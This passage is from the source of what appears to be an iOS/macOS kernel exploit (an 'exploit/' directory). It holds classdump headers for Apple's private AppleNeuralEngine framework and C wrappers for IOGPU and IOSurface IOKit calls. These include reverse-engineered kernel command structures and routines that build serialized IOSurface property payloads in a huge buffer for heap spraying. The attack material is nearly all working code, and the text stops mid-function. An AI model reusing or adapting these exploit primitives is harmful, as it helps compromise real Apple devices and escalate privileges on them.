`exploit/AppleNeuralEngine/_ANEIOSurfaceObject.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
@interface _ANEIOSurfaceObject : NSObject {

	IOSurfaceRef _ioSurface;

}

@property (nonatomic,readonly) IOSurfaceRef ioSurface;              //@synthesize ioSurface=_ioSurface - In the implementation block
+(id)new;
+(id)objectWithIOSurface:(IOSurfaceRef)arg1 ;
+(IOSurfaceRef)createIOSurfaceWithWidth:(int)arg1 pixel_size:(int)arg2 height:(int)arg3 ;
-(id)initWithIOSurface:(IOSurfaceRef)arg1 ;
-(IOSurfaceRef)ioSurface;
-(void)dealloc;
-(id)init;
-(id)description;
@end


```

`exploit/AppleNeuralEngine/_ANELog.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANELog : NSObject
+(id)tool;
+(id)daemon;
+(id)common;
+(id)service;
+(id)framework;
@end


```

`exploit/AppleNeuralEngine/_ANEModel.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

//#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
#import "AppleNeuralEngine-Structs.h"

//#import <libobjc.A.dylib/NSCopying.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSURL, NSString, NSDictionary, _ANEProgramForEvaluation;

@interface _ANEModel : NSObject <NSCopying, NSSecureCoding> {

	char _queueDepth;
	unsigned _perfStatsMask;
	os_unfair_lock_s _l;
	NSURL* _modelURL;
	NSString* _key;
	unsigned long long _string_id;
	unsigned long long _programHandle;
	unsigned long long _intermediateBufferHandle;
	NSDictionary* _modelAttributes;
	_ANEProgramForEvaluation* _program;

}

@property (nonatomic,retain) NSDictionary * modelAttributes;                           //@synthesize modelAttributes=_modelAttributes - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                         //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) char queueDepth;                                          //@synthesize queueDepth=_queueDepth - In the implementation block
@property (assign,nonatomic) unsigned long long intermediateBufferHandle;              //@synthesize intermediateBufferHandle=_intermediateBufferHandle - In the implementation block
@property (assign,nonatomic) os_unfair_lock_s l;                                     //@synthesize l=_l - In the implementation block
@property (nonatomic,retain) _ANEProgramForEvaluation * program;                       //@synthesize program=_program - In the implementation block
@property (assign,nonatomic) unsigned perfStatsMask;                                   //@synthesize perfStatsMask=_perfStatsMask - In the implementation block
@property (nonatomic,readonly) NSURL * modelURL;                                       //@synthesize modelURL=_modelURL - In the implementation block
@property (nonatomic,copy,readonly) NSString * key;                                    //@synthesize key=_key - In the implementation block
@property (nonatomic,readonly) unsigned long long string_id;                           //@synthesize string_id=_string_id - In the implementation block
+(id)new;
+(BOOL)supportsSecureCoding;
+(id)modelAtURL:(id)arg1 key:(id)arg2 ;
+(id)sandboxExtensionPathsForModelURL:(id)arg1 ;
+(id)modelAtURL:(id)arg1 key:(id)arg2 modelAttributes:(id)arg3 ;
-(os_unfair_lock_s)l;
-(id)copyWithZone:(NSZone*)arg1 ;
-(NSString *)key;
-(void)setL:(os_unfair_lock_s)arg1 ;
-(void)dealloc;
-(void)reset;
-(id)init;
-(BOOL)isEqual:(id)arg1 ;
-(id)initWithCoder:(id)arg1 ;
-(NSURL *)modelURL;
-(void)setProgram:(_ANEProgramForEvaluation *)arg1 ;
-(void)encodeWithCoder:(id)arg1 ;
-(_ANEProgramForEvaluation *)program;
-(NSDictionary *)modelAttributes;
-(unsigned long long)intermediateBufferHandle;
-(unsigned long long)hash;
-(id)description;
-(unsigned long long)programHandle;
-(char)queueDepth;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(void)setIntermediateBufferHandle:(unsigned long long)arg1 ;
-(unsigned long long)string_id;
-(unsigned)perfStatsMask;
-(id)initWithModelAtURL:(id)arg1 key:(id)arg2 modelAttributes:(id)arg3 ;
-(void)setModelAttributes:(NSDictionary *)arg1 ;
-(void)setQueueDepth:(char)arg1 ;
-(BOOL)isEqualToModel:(id)arg1 ;
-(void)updateModelAttributes:(id)arg1 ;
-(void)updateModelAttributes:(id)arg1 programHandle:(unsigned long long)arg2 intermediateBufferHandle:(unsigned long long)arg3 queueDepth:(char)arg4 ;
-(id)keyForBundleID:(id)arg1 ;
-(void)setPerfStatsMask:(unsigned)arg1 ;
@end


```

`exploit/AppleNeuralEngine/_ANEPerformanceStats.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class NSData;

@interface _ANEPerformanceStats : NSObject {

	unsigned long long _hwExecutionTime;
	NSData* _perfCounterData;

}

@property (nonatomic,readonly) NSData * perfCounterData;                        //@synthesize perfCounterData=_perfCounterData - In the implementation block
@property (nonatomic,readonly) unsigned long long hwExecutionTime;              //@synthesize hwExecutionTime=_hwExecutionTime - In the implementation block
+(id)new;
+(unsigned)driverMaskForANEFMask:(unsigned)arg1 ;
+(id)statsWithRequestPerformanceBuffer:(void*)arg1 statsBufferSize:(unsigned*)arg2 ;
+(id)statsWithHardwareExecutionNS:(unsigned long long)arg1 ;
-(id)init;
-(id)description;
-(unsigned long long)hwExecutionTime;
-(void)emitPerfcounterSignpostsWithModelStringID:(unsigned long long)arg1 ;
-(id)performanceCounters;
-(id)initWithHardwareExecution:(unsigned long long)arg1 perfCounterData:(id)arg2 ;
-(id)initWithRequestPerformanceBuffer:(void*)arg1 statsBufferSize:(unsigned*)arg2 ;
-(NSData *)perfCounterData;
-(id)stringForPerfCounter:(int)arg1 ;
@end


```

`exploit/AppleNeuralEngine/_ANEProgramForEvaluation.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol OS_dispatch_semaphore;
@class _ANEDeviceController, NSObject;

@interface _ANEProgramForEvaluation : NSObject {

	char _queueDepth;
	_ANEDeviceController* _controller;
	unsigned long long _programHandle;
	unsigned long long _intermediateBufferHandle;
	NSObject*<OS_dispatch_semaphore> _requestsInFlight;
	long long _currentAsyncRequestsInFlight;

}

@property (nonatomic,readonly) _ANEDeviceController * controller;                              //@synthesize controller=_controller - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                                 //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) unsigned long long intermediateBufferHandle;                      //@synthesize intermediateBufferHandle=_intermediateBufferHandle - In the implementation block
@property (nonatomic,readonly) char queueDepth;                                                //@synthesize queueDepth=_queueDepth - In the implementation block
@property (nonatomic,readonly) NSObject*<OS_dispatch_semaphore> requestsInFlight;              //@synthesize requestsInFlight=_requestsInFlight - In the implementation block
@property (assign,nonatomic) long long currentAsyncRequestsInFlight;                           //@synthesize currentAsyncRequestsInFlight=_currentAsyncRequestsInFlight - In the implementation block
+(id)new;
+(id)programWithHandle:(unsigned long long)arg1 intermediateBufferHandle:(unsigned long long)arg2 queueDepth:(char)arg3 ;
-(void)dealloc;
-(id)init;
-(unsigned long long)intermediateBufferHandle;
-(_ANEDeviceController *)controller;
-(id)description;
-(id)initWithHandle:(unsigned long long)arg1 intermediateBufferHandle:(unsigned long long)arg2 queueDepth:(char)arg3 ;
-(unsigned long long)programHandle;
-(char)queueDepth;
-(NSObject*<OS_dispatch_semaphore>)requestsInFlight;
-(long long)currentAsyncRequestsInFlight;
-(void)setCurrentAsyncRequestsInFlight:(long long)arg1 ;
-(BOOL)processRequest:(id)arg1 qos:(unsigned)arg2 qIndex:(unsigned long long)arg3 modelStringID:(unsigned long long)arg4 options:(id)arg5 error:(id*)arg6 ;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(void)setIntermediateBufferHandle:(unsigned long long)arg1 ;
@end


```

`exploit/AppleNeuralEngine/_ANEQoSMapper.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEQoSMapper : NSObject
+(unsigned)aneUserInteractiveTaskQoS;
+(unsigned)aneRealTimeTaskQoS;
+(unsigned)aneUserInitiatedTaskQoS;
+(unsigned)aneDefaultTaskQoS;
+(unsigned)aneUtilityTaskQoS;
+(unsigned)aneBackgroundTaskQoS;
+(unsigned long long)queueIndexForQoS:(unsigned)arg1 ;
+(unsigned long long)realTimeQueueIndex;
+(int)programPriorityForQoS:(unsigned)arg1 ;
+(int)realTimeProgramPriority;
@end


```

`exploit/AppleNeuralEngine/_ANERequest.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class NSArray, _ANEIOSurfaceObject, NSNumber, _ANEPerformanceStats;

@interface _ANERequest : NSObject {

	NSArray* _inputArray;
	NSArray* _inputIndexArray;
	NSArray* _outputArray;
	NSArray* _outputIndexArray;
	_ANEIOSurfaceObject* _weightsBuffer;
	NSNumber* _procedureIndex;
	_ANEPerformanceStats* _perfStats;
	/*^block*/id _completionHandler;

}

@property (nonatomic,retain) _ANEPerformanceStats * perfStats;                   //@synthesize perfStats=_perfStats - In the implementation block
@property (nonatomic,readonly) NSArray * inputArray;                             //@synthesize inputArray=_inputArray - In the implementation block
@property (nonatomic,readonly) NSArray * inputIndexArray;                        //@synthesize inputIndexArray=_inputIndexArray - In the implementation block
@property (nonatomic,readonly) NSArray * outputArray;                            //@synthesize outputArray=_outputArray - In the implementation block
@property (nonatomic,readonly) NSArray * outputIndexArray;                       //@synthesize outputIndexArray=_outputIndexArray - In the implementation block
@property (nonatomic,readonly) _ANEIOSurfaceObject * weightsBuffer;              //@synthesize weightsBuffer=_weightsBuffer - In the implementation block
@property (nonatomic,copy,readonly) NSNumber * procedureIndex;                   //@synthesize procedureIndex=_procedureIndex - In the implementation block
@property (copy) id completionHandler;                                           //@synthesize completionHandler=_completionHandler - In the implementation block
+(id)requestWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 weightsBuffer:(id)arg5 procedureIndex:(id)arg6 ;
+(id)requestWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 procedureIndex:(id)arg5 ;
-(BOOL)validate;
-(_ANEIOSurfaceObject *)weightsBuffer;
-(void)setCompletionHandler:(id)arg1 ;
-(id)description;
-(id)completionHandler;
-(NSArray *)inputArray;
-(NSArray *)inputIndexArray;
-(NSArray *)outputArray;
-(NSArray *)outputIndexArray;
-(NSNumber *)procedureIndex;
-(void)setPerfStats:(_ANEPerformanceStats *)arg1 ;
-(_ANEPerformanceStats *)perfStats;
-(id)initWithInputs:(id)arg1 inputIndices:(id)arg2 outputs:(id)arg3 outputIndices:(id)arg4 weightsBuffer:(id)arg5 procedureIndex:(id)arg6 ;
@end


```

`exploit/AppleNeuralEngine/_ANEStrings.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEStrings : NSObject
+(id)cacheDirectory;
+(id)machServiceName;
+(id)errorDomainGeneric;
+(id)testing_cacheDirectory;
+(id)testing_inputDirectory;
+(id)testing_modelDirectory;
+(id)cacheDeleteServiceName;
+(id)machServiceNamePrivate;
+(id)modelCacheDirectoryWithBuildVersion:(id)arg1 ;
+(id)tempDirectory;
+(id)cloneDirectory;
+(id)errorDomainCompiler;
+(id)errorDomainEspresso;
+(id)restrictedAccessEntitlement;
+(id)compilerServiceAccessEntitlement;
+(id)modelBinaryName;
+(id)defaultCompilerOptionsFilename;
+(id)dataVaultStorageClass;
+(id)testing_cacheDirectoryWithSuffix:(id)arg1 ;
+(id)testing_cacheDirectoryWithSuffix:(id)arg1 buildVersion:(id)arg2 ;
+(id)testing_tempDirectory:(id)arg1 ;
+(id)testing_cloneDirectory:(id)arg1 ;
+(id)testing_modelDirectory:(id)arg1 ;
+(id)testing_modelNames;
+(id)testing_encryptedModelNames;
+(id)testing_dataVaultStorageClass;
@end


```

`exploit/IOGPU.c`:

```c
#include "IOGPU.h"

struct IOGPUNotificationQueueData * do_s_create_notificationqueue(io_connect_t client)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

#if TARGET_OS_OSX
        u32 selector = 17;
#else
        u32 selector = 15;
#endif
        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);

        CHECK_IOKIT_ERR(kr, "s_create_notificationqueue");

        struct IOGPUNotificationQueueData * output = (struct IOGPUNotificationQueueData *)args->sOutput;
        args->sOutput = NULL;

        destroy_args(args);
        return output;
}


void do_s_destroy_notificationqueue(io_connect_t client,uint32_t id)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 1;
        args->scalarI[0] = id;

#if TARGET_OS_OSX
        u32 selector = 18;
#else
        u32 selector = 16;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_destroy_notificationqueue");

        destroy_args(args);
}


struct shmem * do_s_create_shmem(io_connect_t client,uint32_t shm_size,uint32_t shm_type)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 2;
        args->scalarI[0] = shm_size; // size
        args->scalarI[1] = shm_type; // shmem type

        // types : 2 -> AGXDebugBufferShmem, else : IOGPUDeviceShmem

#if TARGET_OS_OSX
        u32 selector = 15;
#else
        u32 selector = 13;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_create_shmem");
        if(kr != KERN_SUCCESS) {
                destroy_args(args);
                return NULL;
        }

        struct shmem * output = (struct shmem *)args->sOutput;
        args->sOutput = NULL;
        destroy_args(args);
        return output;
}

kern_return_t do_s_new_command_queue(io_connect_t client,void *in,uint32_t *queue_id)
{

        uint32_t structInputCnt = 1032;
        uint32_t structOutputCnt = 16;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        memcpy(input,in,structInputCnt);

        args->client = client;


#if TARGET_OS_OSX
        u32 selector = 8;
#else
        u32 selector = 7;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_new_command_queue");
        *queue_id = *(uint32_t *)args->sOutput;

        destroy_args(args);
        return kr;
}

void do_s_submit_command_buffers(io_connect_t client,uint32_t cmdqID,uint8_t *buf,uint32_t size)
{

        uint32_t structInputCnt = size;
        uint32_t structOutputCnt = 0;
        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        memcpy(input,buf,size);
        args->client = client;

        args->scalarISize = 1;
        args->scalarI[0] = cmdqID;

#if TARGET_OS_OSX
        u32 selector = 30;
#else
        u32 selector = 26;
#endif

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               selector,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_submit_command_buffers");
        destroy_args(args);
}

kern_return_t do_s_set_command_queue_notification_queue(io_connect_t client,uint32_t command_id,uint32_t notify_id)
{

        uint32_t structInputCnt = 0;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        args->client = client;

        args->scalarISize = 2;
        args->scalarI[0] = command_id;
        args->scalarI[1] = notify_id;
#if TARGET_OS_OSX
        u32 selector = 29;
#else
        u32 selector = 25;
#endif

        kern_return_t kr =  IOConnectCallMethod(args->client,
                                                selector,
                                                args->scalarI,args->scalarISize,
                                                args->sInput, args->sInputSize,
                                                args->scalarO, (uint32_t *)&args->scalarOSize,
                                                args->sOutput, (size_t *)&args->sOutputSize);
        CHECK_IOKIT_ERR(kr, "s_set_command_queue_notification_queue");
        destroy_args(args);
        return kr;
}

```

`exploit/IOGPU.h`:

```h
#ifndef H_IOGPU_H
#define H_IOGPU_H

#include "iokit.h"

struct IOGPUNotificationQueueData
{
        uint64_t address;
        uint32_t id;
};

struct shmem {
        uint8_t *shm_addr;
        uint32_t shm_len;
        uint32_t shm_id;
};

typedef struct {
        vm_address_t gpuAddress;
        vm_address_t shm_addr;
        vm_address_t ro_addr;
        uint32_t unk_0x18;
        int resource_id;
        size_t resident_size;
        uint64_t unk_0x28;
        uint64_t unk_0x30;
        uint64_t unk_0x38;
        uint64_t protection;
        uint64_t unk_0x48;
}IOGPUNewResourceReturnData;

typedef uint32_t u32;
typedef uint64_t u64;
typedef struct {
        uint32_t field_0;
        uint32_t count; // how many submitArgs do we have in this structure ?
} IOGPUCommandQueueSubmitArgs_Header_t;

typedef struct {
        uint32_t shmid_1;
        uint32_t shmid_3;
        uint32_t shmid_2;
        uint64_t notify_1;
        uint64_t notify_2;
        uint32_t debug_shm_id;
        uint32_t padding;
} IOGPUCommandQueueSubmitArgs_Command_t;


typedef struct {
        IOGPUCommandQueueSubmitArgs_Header_t hdr;
        IOGPUCommandQueueSubmitArgs_Command_t body[1];
} IOGPUCommandQueueSubmitArgs_t;



/* Shmem1 struct for s_submit_command_buffers() */

struct IOGPUKernelCommand_Cmd_0x10005 {
        u64 mtlateevent_id;
        u64 kdebug_id;
};

struct IOGPUKernelCommand_Cmd_0x10003 {
        u64 var1; // must be less than 0x100
		u64 unused;
};

struct IOGPUKernelCommand_Cmd_0x2 {
        u64 sleep; // put the thread to sleep
};

struct IOGPUKernelCommand_Cmd_0x3 {
        u32 IOSurfacesharedEventId;
		u32 padd;
		u64 raw_64;
};

struct IOGPUKernelCommand_Cmd_0x4 {
        u32 IOSurfacesharedEventId;
		u32 padd;
		u64 raw_64;
};

struct IOGPUKernelCommand_Cmd_0x5 {
        u64 MTLEventId;
		u64 tosubmit;
};

struct IOGPUKernelCommand_Cmd_0x6 {
        u64 MTLEventId;
		u64 value;
};

// must be bigger than > 4
struct IOGPUKernelCommand_Cmd_0x8 {
        u32 resId_count;
		u32 resourceIds[];
};


struct IOGPUKernelCommand_Cmd_0x9 {
        u64 protection;
};

union IOGPUKernelCommand_Cmd
{
        /* ... */
        /* processKernelCommands ... */
		struct IOGPUKernelCommand_Cmd_0x10003 Cmd_0x10003;
		struct IOGPUKernelCommand_Cmd_0x10005 Cmd_0x10005;
		struct IOGPUKernelCommand_Cmd_0x2 Cmd_0x2;
		struct IOGPUKernelCommand_Cmd_0x3 Cmd_0x3;
		struct IOGPUKernelCommand_Cmd_0x4 Cmd_0x4;
		struct IOGPUKernelCommand_Cmd_0x5 Cmd_0x5;
		struct IOGPUKernelCommand_Cmd_0x6 Cmd_0x6;
		struct IOGPUKernelCommand_Cmd_0x8 Cmd_0x8;
		struct IOGPUKernelCommand_Cmd_0x9 Cmd_0x9;

};

struct IOGPUKernelCommand
{
        int type;
        int size;
        union IOGPUKernelCommand_Cmd cmd;
};



/* Shmem3 struct for s_submit_command_buffers() */
struct Shmem3_header
{
        uint32_t field0;
        uint32_t field4;
        uint32_t count;
        uint32_t fieldC;
};

struct Shmem3_offsets
{
        uint32_t kernelCommandStart;
        uint32_t kernelCommandEnd;
};

struct Shmem3
{
        struct Shmem3_header hdr;
        struct Shmem3_offsets off;
};



IOGPUNewResourceReturnData * do_s_new_resource(io_connect_t client, const char *str,size_t size, int *retval);
struct IOGPUNotificationQueueData * do_s_create_notificationqueue(io_connect_t client);
void do_s_destroy_notificationqueue(io_connect_t client,uint32_t id);
struct shmem * do_s_create_shmem(io_connect_t client,uint32_t shm_size,uint32_t shm_type);
kern_return_t do_s_new_command_queue(io_connect_t client,void *in,uint32_t *queue_id);
void do_s_submit_command_buffers(io_connect_t client,uint32_t cmdqID,uint8_t *buf,uint32_t size);
kern_return_t do_s_set_command_queue_notification_queue(io_connect_t client,uint32_t command_id,uint32_t notify_id);

#endif  /* H_IOGPU_H */


```

`exploit/IOSurface.c`:

```c
#include "IOSurface.h"

io_connect_t get_surface_client(void)
{
        return iokit_get_connection("IOSurfaceRoot",0);
}


io_connect_t create_surface_fast_path(io_connect_t surface,uint32_t *surface_id,IOSurfaceFastCreateArgs *args)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        char output[IOSurfaceLockResultSize] = {0};
        size_t output_cnt = IOSurfaceLockResultSize;

        if (surface == 0) {
                conn = get_surface_client();
        }

        kr = IOConnectCallMethod(conn, 6, 0,0,
                                 args, 0x20,
                                 NULL, NULL, output, &output_cnt);
        CHECK_IOKIT_ERR(kr, "create_surface_fast_path");
        assert(kr == KERN_SUCCESS);

        if (surface_id != NULL)
                *surface_id = *(uint32_t *)(output + 0x18);

        return conn;
}

io_connect_t release_surface(io_connect_t surface,uint32_t surface_id)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        uint64_t scalar = (uint64_t)surface_id;
        kr = IOConnectCallMethod(conn, 1, &scalar,1,
                                 NULL,0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "release_surface");
        assert(kr == KERN_SUCCESS);

        return conn;
}


mach_port_t iosurface_create_shared_event(io_connect_t c)
{
        kern_return_t kr = KERN_SUCCESS;

        uint32_t outputSize = 1;
        uint64_t port = 0;
        kr = IOConnectCallMethod(c, 36, 0,0,
                                 NULL, 0,
                                 &port, &outputSize, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "do_create_shared_event");
        return (mach_port_t)port;
}

kern_return_t iosurface_signal_shared_event(io_connect_t c,mach_port_t sharedRefId, uint64_t signal)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[2] = {(uint64_t)sharedRefId,signal};

        kr = IOConnectCallMethod(c, 37, scalar,2,
                                 NULL, 0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_signal_shared_event");
        return kr;
}


kern_return_t iosurface_query_shared_event(io_connect_t c,mach_port_t sharedRefId)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[1] = {(uint64_t)sharedRefId};
        uint64_t scalarO[2] = {0};
        uint32_t scalarOSize = 2;

        kr = IOConnectCallMethod(c, 38, scalar,1,
                                 NULL, 0,
                                 scalarO,&scalarOSize , NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_query_shared_event");
        //printf("Completed Value 0x%llx \n",scalarO[0]);

        return kr;
}

kern_return_t iosurface_notify_shared_event(io_connect_t c,mach_port_t sharedRefId,
                                            uint64_t arg1,
                                            uint64_t arg2,
                                            uint64_t arg3,
                                            uint64_t arg4)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t scalar[5] = {(uint64_t)sharedRefId,arg1,arg2,arg3,arg4};

        kr = IOConnectCallMethod(c, 39, scalar,5,
                                 NULL, 0,
                                 NULL,NULL , NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_noitfy_shared_event");

        return kr;
}


void add_shared_event_notification_port(io_connect_t c,mach_port_t port,uint64_t *references)
{
        kern_return_t kr = KERN_SUCCESS;

        kr = IOConnectCallAsyncMethod(c, 40, port, references, 8,
                                      NULL, 0,
                                      NULL, 0,
                                      NULL, NULL,
                                      NULL, NULL);
        CHECK_IOKIT_ERR(kr, "add_shared_event_notification_port");
}


void notify_shared_event(io_connect_t c,u64 sharedRefId, u64 refcon, u64 a,u64 b,u64 cc)
{
        kern_return_t kr = KERN_SUCCESS;

        uint64_t scalars[5] = {sharedRefId,refcon,a,b,cc};
        kr = IOConnectCallMethod(c, 39, scalars,5,
                                 NULL, 0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "do_create_shared_event");

}



uint32_t *prop_data = 0;
vm_size_t prop_data_size = 0xff000000;
void * init_iosurface_prop_data(void)
{
        if(prop_data)
                return prop_data;

        mach_vm_address_t addr = 0;
#if TARGET_OS_IOS
        prop_data_size = 0xf000000;
#endif
        kern_return_t kr = _kernelrpc_mach_vm_allocate_trap(mach_task_self(),&addr,prop_data_size,1);

        CHECK_IOKIT_ERR(kr, "allocate_properties_buf");
        prop_data = (uint32_t*)addr;
        return prop_data;

}


void iosurface_remove_property(io_connect_t surface,uint32_t surface_id,uint32_t key)
{

        kern_return_t kr = KERN_SUCCESS;
        uint64_t _output = 0;
        size_t output_cnt = 4;

        uint64_t payload[2];
        payload[0] = surface_id;
        payload[1] = key;

        kr = IOConnectCallMethod(surface, 11,
                                 NULL,
                                 0,
                                 payload,
                                 0x10,
                                 NULL, NULL,
                                 &_output, &output_cnt);

        assert(kr == KERN_SUCCESS);
}

void iosurface_get_value(io_connect_t client,uint32_t surface_id,uint32_t key,void *output,size_t *outputSize)
{

        kern_return_t kr = KERN_SUCCESS;
        uint64_t payload[2];
        payload[0] = surface_id;
        payload[1] = key;

        kr = IOConnectCallMethod(client,
                                 10,
                                 NULL,
                                 0,
                                 payload,
                                 0x10,
                                 NULL, NULL,
                                 output, outputSize);

        assert(kr == KERN_SUCCESS);
}

void iosurface_set_value(io_connect_t surface,uint32_t surface_id)
{
        kern_return_t kr = KERN_SUCCESS;
        uint64_t _output = 0;
        size_t output_cnt = 4;

        *(uint64_t *) prop_data =  surface_id;

        kr = IOConnectCallMethod(surface, 9,
                                 NULL,
                                 0,
                                 prop_data,
                                 prop_data_size,
                                 NULL, NULL,
                                 &_output, &output_cnt);

        CHECK_IOKIT_ERR(kr, "iosurface_set_value");
        assert(kr == KERN_SUCCESS);
}

uint32_t build_iosurface_payload(uint32_t count,uint8_t *data,uint32_t datasize,uint32_t key)
{
        assert(prop_data != NULL);

        uint32_t * binary = prop_data + 2;
        memset((char *)prop_data,0,prop_data_size );

        int cur = 0;

        binary[cur++]  = kOSSerializeBinarySignature;
        binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

        binary[cur++] = (kOSSerializeArray | count);
        // count : how many object we want ?
        for(int i=0; i< count; i++) {
                int end = (i == (count -1))? kOSSerializeEndCollection : 0;
                binary[cur++]  = (end |kOSSerializeData | datasize );
                memcpy((char *)&binary[cur],data,datasize);
                cur +=  (datasize +3)/4;
        }

        binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
        binary[cur++]  = key;
        binary[cur++]  = 0;
        return cur;
}

uint32_t build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key)
{

        uint32_t * binary = prop_data + 2;//a place for surface id
        memset((char *)prop_data,0,prop_data_size);

        int cur = 0;

        binary[cur++]  = kOSSerializeBinarySignature;
        binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

        binary[cur++] = (kOSSerializeArray | count);
        // count : how many object we want ?
        for(int i=0; i< count; i++) {
                int end = (i == (count -1))? kOSSerializeEndCollection : 0;
                binary[cur++]  = (end |kOSSerializeString | stringsize -1 );
                memcpy((char *)&binary[cur],string,stringsize);
                cur +=  (stringsize +3)/4;
        }

